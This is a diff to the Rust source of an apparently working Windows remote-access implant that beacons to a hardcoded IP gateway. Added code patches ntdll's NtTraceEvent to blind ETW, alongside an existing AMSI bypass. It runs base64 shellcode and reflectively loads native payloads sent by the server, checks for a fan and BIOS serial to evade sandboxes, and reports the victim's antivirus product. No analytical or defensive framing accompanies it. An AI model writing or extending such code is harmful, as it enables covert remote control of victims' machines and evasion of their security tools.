@@ -1,11 +1,14 @@
+#![windows_subsystem = "windows"]
 extern crate colored; 
+
+use core::time::Duration;
+use crate::env::consts;
 
 use std::{
    process::exit, str, time::{SystemTime, UNIX_EPOCH}
 };
 
 use std::thread;
-use std::time::Duration;
 
 use std::env;
 use std::process;
@@ -53,38 +56,43 @@ use windows::Win32::System::Threading::GetCurrentProcess;
 use windows::core::{ s, w };
 use windows::Win32::System::LibraryLoader::{ LoadLibraryW, GetProcAddress };
 use windows::Win32::System::Memory::PAGE_EXECUTE_READWRITE;
+use windows::Win32::Foundation::GetLastError;
+use std::mem;
 
 extern crate kernel32;
 extern crate winapi;
 use std::ptr::null_mut;
+use export_resolver::ExportList;
 
 use serde::Deserialize;  
+
+use libloading::{Library, Symbol};
+use std::ptr::null;
 
 #[derive(Deserialize, Debug)]  
 pub struct Win32BIOS {  
     pub serialnumber: String,  
 }  
 
-const CONNECTION_INTERVAL: u64 = 30;
-const ANTI_VIRTUAL: bool = false;
-const GATEWAY_PATH: &str = "https://4c7a-169-150-203-56.ngrok-free.app/gateway";
+const BUILD_ID: &str = "debug";
+const CONNECTION_INTERVAL: u64 = 5;
+const ANTI_VIRTUAL: bool = true;
+const GATEWAY_PATH: &str = "http://109.107.189.154:80/gateway";
 const SERVER_RSA_PUB: &str = "
 -----BEGIN RSA PUBLIC KEY-----
-MIIBCgKCAQEAx+zN1dr6iV1Upyd9ixoG2gxvupYqIeuFMV0GgWcCK91pcPZCkeQG
-SDy/LhGjCjOMvX/2Eg0wsed99hntvZ2b6RKdsdfrSVUFxvp6H0lEVPGPjDCMssjY
-RLi3JbKIopLtgdDHdnf4nCpnSrMNFV5ZuqdIoQIMaw/imyWATNSB18WOebAA8lI9
-oR0XG89Ob3/IyxIAK1rUqlx1a1oJ+uBsLscsxwOGWyXir6by31uVfrdzxORFviCr
-8bZfuX5wF06WQ9TH1WFAw/G4CTTWP5qooLug04Qt7cAemTLfJjkyaDeLq20ia2ix
-xs9LxVype+cEoOSfpawaAH71Kw+d40Dp7wIDAQAB
+MIIBCgKCAQEAsG8YIs0tjiau5c0ME9EOvBru1FcgPoxW6xkzS9u7NdVsXVfMz+gO
+g0JBTEqm+OpYjgCT34FYM/VQqzCl+y0HtCAP23XYuJrxPSiYdNFxrjsUBEzw5Spi
+RFvvKPs+lWS6zl20sm35h1BoN+ZbgGrtCavnrzydOByiP/Epon1UKWc81QmmY2ec
+xcXp9GsFXlV93Cc6ZMhxhWtwlv7j1iU3hQeA+8Jxz5IZnRmwSdeGWqq0xcMgBW9a
+F0X8kyvTd4Xb9QKK4wZ7rVHbs0sfEhfo6PVBOaJQS6ubmD/RooJdmGdhP4wnJC3b
+9Ea8L+hHTaylw+ghBgq+9wCrnDVyvxMGDQIDAQAB
 -----END RSA PUBLIC KEY-----
 ";
-
 
 // Main loop that handles sending a heartbeat and recieving connections to server is always running. 
 // When the main loop recieves a task, it adds it to a global vec.
 // Another loop in another thread will go through each item in the global vec, and complete the task.
 // After the task is completed, it will send a "submit_output" request to the server.
-
 
 fn main() {
 
@@ -131,8 +139,6 @@ fn main() {
             fprint("error", "Unable to change memory permissions at the function pointer back to the original value");
         }
 
-
-
         let result = LoadLibraryW(w!("C:\\Windows\\System32\\amsi.dll"));
        
         let farproc = GetProcAddress(result.unwrap(), s!("AmsiScanBuffer"));
@@ -169,6 +175,45 @@ fn main() {
             println!("Failed to patch");
         }
     };
+
+    let mut exports = ExportList::new();
+
+    exports.add("ntdll.dll", "NtTraceEvent").expect("[-] Error finding address of NtTraceEvent");
+
+    // retrieve the virtual address of NtTraceEvent
+    let nt_trace_addr = exports.get_function_address("NtTraceEvent").expect("[-] Unable to retrieve address of NtTraceEvent.") as *const c_void;
+
+    // get a handle to the current process
+    let handle = unsafe {GetCurrentProcess()};
+
+    // set up variables for WriteProcessMemory
+    let ret_opcode: u8 = 0xC3; // ret opcode for x86
+    let size = mem::size_of_val(&ret_opcode);
+    let mut bytes_written: usize = 0;
+
+
+    // patch the function 
+    let res = unsafe {
+        WriteProcessMemory(handle, 
+            nt_trace_addr,
+            &ret_opcode as *const u8 as *const c_void, 
+            size, 
+            Some(&mut bytes_written as *mut usize),
+        )
+    };
+
+    // interrupt breakpoint - leave this in if you want to inspect the patch in a debugger
+    // unsafe { asm!("int3") };
+
+    match res {
+        Ok(_) => {
+            fprint("success", &format!("[+] Success data written. Number of bytes: {:?} at address: {:p}", bytes_written, nt_trace_addr));
+        },
+        Err(_) => {
+            let e = unsafe { GetLastError() };
+            fprint("error", &format!("[-] Error with WriteProcessMemory: {:?}", e));
+        },
+    }    
 
     anti_virtualization();
     let (client_id, encryption_key) = init_connection();
@@ -228,7 +273,6 @@ fn heartbeat_loop(client_id_intake: String, encryption_key_intake: String) {
 
         let result = match ureq::post(GATEWAY_PATH).send_string(&combined) {
             Ok(result) => {
-                fprint("heartbeat", "Heartbeat sent.");
                 result.into_string().unwrap()
             },
             Err(error) => {
@@ -250,24 +294,26 @@ fn heartbeat_loop(client_id_intake: String, encryption_key_intake: String) {
         };
 
         match str::from_utf8(&decrypted_response).unwrap() {
-            "Ok" => {continue},
+            "Ok" => {
+                fprint("heartbeat", "No new commands to fullfill.");
+                continue
+            },
             _ => ()
         };
 
-        let mut client_id = client_id.clone();
-        let mut encryption_key = encryption_key.clone();
+        let client_id = client_id.clone();
+        let encryption_key = encryption_key.clone();
 
         let decrypted_response_json = match serde_json::from_slice::<serde_json::Value>(&decrypted_response) {
             Ok(result) => result,
             Err(_) => {
                 fprint("error", "Unable to convert decrypted response into json.");
-                (client_id, encryption_key) = init_connection();
                 continue
             }
         };
 
         thread::spawn(move || {
-          
+            fprint("info", &format!("Handling command: {}", key_to_string(&decrypted_response_json, "cmd_type").as_str()));
             match key_to_string(&decrypted_response_json, "cmd_type").as_str() {
                 "DOTNET Execution" => {
                     let payload_bytes = BASE64_STANDARD.decode(key_to_string(&decrypted_response_json, "cmd_args")).unwrap();
@@ -283,6 +329,109 @@ fn heartbeat_loop(client_id_intake: String, encryption_key_intake: String) {
                         }
                     }
                 },
+
+                "Shellcode Execution" => {
+
+                    const MEM_COMMIT: u32 = 0x1000;
+                    const MEM_RESERVE: u32 = 0x2000;
+                    const PAGE_EXECUTE: u32 = 0x10;
+                    const PAGE_READWRITE: u32 = 0x04;
+                    const FALSE: i32 = 0;
+                    const WAIT_FAILED: u32 = 0xFFFFFFFF;
+
+                    let shellcode = BASE64_STANDARD.decode(key_to_string(&decrypted_response_json, "cmd_args")).unwrap();
+                    let shellcode_size = shellcode.len();
+                
+                    unsafe {
+                        thread::spawn(move || {
+
+                            let kernel32 = Library::new("kernel32.dll").expect("[-]no kernel32.dll!");
+                            let ntdll = Library::new("ntdll.dll").expect("[-]no ntdll.dll!");
+                    
+                            let get_last_error: Symbol<unsafe extern "C" fn() -> u32> = kernel32
+                                .get(b"GetLastError\0")
+                                .expect("[-]no GetLastError!");
+                    
+                            let virtual_alloc: Symbol<
+                                unsafe extern "C" fn(*const c_void, usize, u32, u32) -> *mut c_void,
+                            > = kernel32
+                                .get(b"VirtualAlloc\0")
+                                .expect("[-]no VirtualAlloc!");
+                    
+                            let virtual_protect: Symbol<
+                                unsafe extern "C" fn(*const c_void, usize, u32, *mut u32) -> i32,
+                            > = kernel32
+                                .get(b"VirtualProtect\0")
+                                .expect("[-]no VirtualProtect!");
+                    
+                            let rtl_copy_memory: Symbol<unsafe extern "C" fn(*mut c_void, *const c_void, usize)> =
+                                ntdll.get(b"RtlCopyMemory\0").expect("[-]no RtlCopyMemory!");
+                    
+                            let create_thread: Symbol<
+                                unsafe extern "C" fn(*const c_void, usize, *const c_void, u32, *mut u32) -> isize,
+                            > = kernel32
+                                .get(b"CreateThread\0")
+                                .expect("[-]no CreateThread!");
+                    
+                            let wait_for_single_object: Symbol<unsafe extern "C" fn(isize, u32) -> u32> = kernel32
+                                .get(b"WaitForSingleObject")
+                                .expect("[-]no WaitForSingleObject!");
+                    
+                            let addr = virtual_alloc(
+                                null(),
+                                shellcode_size,
+                                MEM_COMMIT | MEM_RESERVE,
+                                PAGE_READWRITE,
+                            );
+                            if addr.is_null() {
+                                panic!("[-]virtual_alloc failed: {}!", get_last_error());
+                            }
+
+                            rtl_copy_memory(addr, shellcode.as_ptr().cast(), shellcode_size);
+                
+                            let mut old = PAGE_READWRITE;
+                            let res = virtual_protect(addr, shellcode_size, PAGE_EXECUTE, &mut old);
+                            if res == FALSE {
+                                panic!("[-]virtual_protect failed: {}!", get_last_error());
+                            }
+                            
+                            submit_output(
+                                &client_id, &key_to_string(&decrypted_response_json, "command_id"), 
+                                "Reached last stage before execution. Asssumed success.", 
+                                &encryption_key
+                            );
+
+                            let handle = create_thread(null(), 0, addr, 0, null_mut());
+                            if handle == 0 {
+                                panic!("[-]create_thread failed: {}!", get_last_error());
+                            }
+
+                            wait_for_single_object(handle, WAIT_FAILED);
+                        });
+                       
+                
+                    }
+                },
+
+                "Native Execution" => {
+                    let payload_bytes = BASE64_STANDARD.decode(key_to_string(&decrypted_response_json, "cmd_args")).unwrap();
+                    if !check_dotnet(payload_bytes.clone()) {
+                        unsafe {
+                            submit_output(
+                                &client_id, &key_to_string(&decrypted_response_json, "command_id"), 
+                                "Reached last stage before execution. Assumed success.", 
+                                &encryption_key
+                            );
+                            reflective_loader(payload_bytes);
+                        };
+                    } else {
+                        submit_output(
+                            &client_id, &key_to_string(&decrypted_response_json, "command_id"), 
+                            "DOTNET file, not native. Upload a native payload.", 
+                            &encryption_key
+                        )
+                    }
+                }
 
                 unsupported_command => {
                     fprint("failure", &format!("Unsupported Command: {}", unsupported_command));
@@ -315,6 +464,19 @@ fn anti_virtualization() {
         },
         Err(_) => {
             fprint("error", "Invalid bios serial detected");
+            terminate_and_block();
+        }
+    };
+
+    match wmi_con.raw_query::<HashMap<String, String>>("SELECT Name FROM Win32_Fan") {
+        Ok(results) => {
+            if format!("{:?}", results) == "[]" {  
+                fprint("error", "No fan detected.");
+                terminate_and_block();
+            }
+        },
+        Err(error) => {
+            fprint("error", &format!("Error while querying fan: {}", error));
             terminate_and_block();
         }
     };
@@ -403,15 +565,18 @@ fn init_connection() -> (String, String) {
         }
     };
 
-    let antivirus: String = match wmi_con.raw_query::<HashMap<String, Variant>>("SELECT displayName FROM AntiVirusProduct") {
+    let _initialized_com = COMLibrary::new().unwrap();
+    let wmi_con = WMIConnection::with_namespace_path("ROOT\\securitycenter2", COMLibrary::new().unwrap()).unwrap();
+    let antivirus: String = match wmi_con.raw_query::<HashMap<String, String>>("SELECT displayName FROM AntiVirusProduct") {
         Ok(results) => {
-            results.iter().map(|os|     
-                parse_wmi(&os["displayName"])
-            ).collect::<Vec<_>>().join("")
-        }, 
-
-        Err(error) => {
-            fprint("error", &format!("Couldn't get AntiVirus. Error: {:?} ", error));
+            let mut result: String = "N/A".to_string();
+            for av in results {
+                result = av.get("displayName").unwrap().to_string();
+            }
+            result
+        },
+        Err(_) => {
+            fprint("error", "Unable to resolve WMI for securitycenter.");
             terminate_and_block();
             "N/A".to_string()
         }
@@ -430,7 +595,7 @@ fn init_connection() -> (String, String) {
                 result.into_string().unwrap()
             },
             Err(error) => {
-                fprint("error", &format!("Unable to initialize handshake with server. Error: {}", error));
+                fprint("error", &format!("Unable to initialize handshake with server. Error: {:?}", error));
                 continue;
             }
         };
@@ -477,6 +642,7 @@ fn init_connection() -> (String, String) {
 
         let rsaed_encryption_key = BASE64_STANDARD.encode(server_pub_rsa.encrypt(&mut rng, Pkcs1v15Encrypt, &encryption_key.as_bytes()).unwrap());
         let registration_payload = aes_256cbc_encrypt(&json!({
+            "build_id": BUILD_ID,
             "version": 10,
             "uac": false,
             "username": username,
